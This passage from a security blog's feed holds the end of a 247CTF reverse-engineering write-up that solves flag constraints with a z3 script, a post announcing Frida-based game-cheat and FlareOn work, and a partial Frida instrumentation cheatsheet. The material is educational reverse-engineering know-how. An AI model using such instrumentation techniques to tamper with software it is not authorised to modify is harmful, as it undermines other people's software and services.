((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2332&lt;/span&gt;) 
((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;) 
((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;800&lt;/span&gt;) 
((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt;) 
((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;248&lt;/span&gt;) 
((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2694&lt;/span&gt;) 
((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9813&lt;/span&gt;) 
((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;) 
((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4950&lt;/span&gt;) 
((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5143&lt;/span&gt;) 
((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2759&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can notice a lot of expressions -&amp;gt; &lt;del&gt;we can&amp;rsquo;t&lt;/del&gt; don&amp;rsquo;t want to solve it manually - we need to write a script.&lt;/p&gt;
&lt;p&gt;Expressions are utilizing different operations, so we can&amp;rsquo;t simply parse them in python, it is better to use some specialized tool like &lt;a href=&#34;https://github.com/Z3Prover/z3&#34;&gt;z3-solver&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; z3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
z &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Solver()

&lt;span style=&#34;color:#75715e&#34;&gt;# We are creating the bit represenation of int32, 40 = len(FLAG)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# I&amp;#39;m using vectors not ints, because ints are not supporting XOR&lt;/span&gt;
flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [BitVec(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{:02}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(i), &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;)]
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; flag:
    z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;, i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;)
    &lt;span style=&#34;color:#75715e&#34;&gt;# z.add(i &amp;gt; 30, i &amp;lt; 127) potential optimization&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# copy-paste the conditions&lt;/span&gt;
z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add((flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) 
z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add((flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;234&lt;/span&gt;) 
&lt;span style=&#34;color:#75715e&#34;&gt;### ---[Stripped conditions]---&lt;/span&gt;
z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add((flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# Check if  z3 can solve the problem&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sat&amp;#34;&lt;/span&gt;:
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;z3 can solve it&amp;#34;&lt;/span&gt;)

    &lt;span style=&#34;color:#75715e&#34;&gt;# now we can create the model and evaluate it to &amp;#34;real&amp;#34; values&lt;/span&gt;
    model &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;model()
    solution &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; f &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; flag:
        solution &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(int(model&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;evaluate(f)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;as_long()))
        print(solution)
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;unsolvable&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will give as a flag :)&lt;/p&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://247ctf.com/&#34;&gt;247CTF&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/Z3Prover/z3&#34;&gt;z3-solver&lt;/a&gt;]&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Boolean_satisfiability_problem&#34;&gt;SAT problem&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content>
    </item>
    
    <item>
      <title>[0x0] FRIDA Playground</title>
      <link>/posts/0-frida-playgrounds/</link>
      <pubDate>Sun, 26 Jul 2020 15:31:42 +0200</pubDate>
      
      <guid>/posts/0-frida-playgrounds/</guid>
      <description>&lt;p&gt;Hello, this is the very first post of my new series where I will show the big potential of &lt;a href=&#34;#references&#34;&gt;frida&lt;/a&gt; on practical examples.&lt;/p&gt;</description>
      <content>&lt;p&gt;Hello, this is the very first post of my new series where I will show the big potential of &lt;a href=&#34;#references&#34;&gt;frida&lt;/a&gt; on practical examples.&lt;/p&gt;
&lt;h2 id=&#34;about&#34;&gt;About&lt;/h2&gt;
&lt;p&gt;If you want to learn more about frida, then I suggest you to check my &lt;a href=&#34;/posts/frida-cheatsheet/&#34;&gt;notes/cheatsheet&lt;/a&gt; or frida&amp;rsquo;s &lt;a href=&#34;https://frida.re/docs/home/&#34;&gt;docs&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Check tag &lt;a href=&#34;/tags/frida-playground/&#34;&gt;#frida-playground&lt;/a&gt; for all posts.&lt;/p&gt;
&lt;h2 id=&#34;lab-setup&#34;&gt;Lab Setup&lt;/h2&gt;
&lt;p&gt;My environment:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;host machine - the place where I&amp;rsquo;m writing scripts, run scripts, etc&lt;/li&gt;
&lt;li&gt;guest vms - machines where ctf binaries are run:
&lt;ul&gt;
&lt;li&gt;Windows10 (vbox)&lt;/li&gt;
&lt;li&gt;REmnux (vbox)&lt;/li&gt;
&lt;li&gt;Android (nox)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;planned-content&#34;&gt;Planned Content&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Game Hacking &amp;amp; &amp;ldquo;Cheats&amp;rdquo; Development for &lt;a href=&#34;https://store.steampowered.com/app/690040/SUPERHOT_MIND_CONTROL_DELETE/&#34;&gt;SUPERHOT: MIND CONTROL DELETE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Solve some &lt;a href=&#34;#references&#34;&gt;FlareOn&lt;/a&gt; challenges.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://frida.re&#34;&gt;Frida&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://flare-on.com/&#34;&gt;FlareOn&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;/posts/frida-cheatsheet/&#34;&gt;Cheatsheet&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content>
    </item>
    
    <item>
      <title>Frida Cheatsheet</title>
      <link>/posts/frida-cheatsheet/</link>
      <pubDate>Sun, 26 Jul 2020 15:25:42 +0200</pubDate>
      
      <guid>/posts/frida-cheatsheet/</guid>
      <description></description>
      <content>&lt;blockquote&gt;
&lt;p&gt;Notes are mostly based on the &lt;a href=&#34;#references&#34;&gt;frida-boot&lt;/a&gt; labs.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;Quick Start&lt;/h2&gt;
&lt;p&gt;Frida project quick start:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;git clone https://github.com/trib0r3/frida-scripts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;default-stuff&#34;&gt;Default stuff&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;remote port: &lt;code&gt;27042&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;code-snippets&#34;&gt;Code snippets:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/iddoeldor/frida-snippets&#34;&gt;GitHub - iddoeldor/frida-snippets: Hand-crafted Frida examples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://codeshare.frida.re/&#34;&gt;https://codeshare.frida.re/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;useful-api-calls&#34;&gt;Useful API calls&lt;/h2&gt;
&lt;h3 id=&#34;debugging&#34;&gt;Debugging&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// print local environment (variables)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;JSON&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;stringify&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;enumerate-binary&#34;&gt;Enumerate binary&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// list loaded libraries
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Process&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;enumerateModulesSync&lt;/span&gt;();

&lt;span style=&#34;color:#75715e&#34;&gt;// list functions of the library
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Process&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getModuleByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc-2.30.so&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;enumerateExports&lt;/span&gt;();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;resolving-libsfuncs-location&#34;&gt;Resolving libs/funcs location&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ts&#34; data-lang=&#34;ts&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// get reference to library
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Process&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getModuleByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc-2.30.so&amp;#34;&lt;/span&gt;);

&lt;span style=&#34;color:#75715e&#34;&gt;// Retrieve from symbols
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Module&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getExportByName&lt;/span&gt;(&lt;span style=&#34;color:#75715e&#34;&gt;/* libname or */&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sleep&amp;#34;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sleep&amp;#34;&lt;/span&gt;);

&lt;span style=&#34;color:#75715e&#34;&gt;// Calculate based on offset
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Module&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getBaseAddress&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;libc-2.30.so&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0xcad90&amp;#34;&lt;/span&gt;);
&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0x7fc2edc42d90&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;script-communication&#34;&gt;Script Communication&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;via &lt;code&gt;recv&lt;/code&gt; and &lt;code&gt;send&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;via RPC
&lt;ul&gt;
&lt;li&gt;you can provide arguments and receive the return values&lt;/li&gt;
&lt;li&gt;whole logic can be held in python, only binary operations are in JS&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;rpc&#34;&gt;RPC&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;TypeScript
&lt;ol&gt;
&lt;li&gt;Get reference to the function&lt;/li&gt;
&lt;li&gt;Create it prototype&lt;/li&gt;
&lt;li&gt;Make them python-accessible by adding them to the &lt;code&gt;rpc.exports&lt;/code&gt; dictionary.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Python
&lt;ol&gt;
&lt;li&gt;Reference functions with &lt;code&gt;script.exports.&amp;lt;func_name&amp;gt;()&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;testPinPtr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DebugSymbol&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getFunctionByName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test_pin&amp;#34;&lt;/span&gt;);
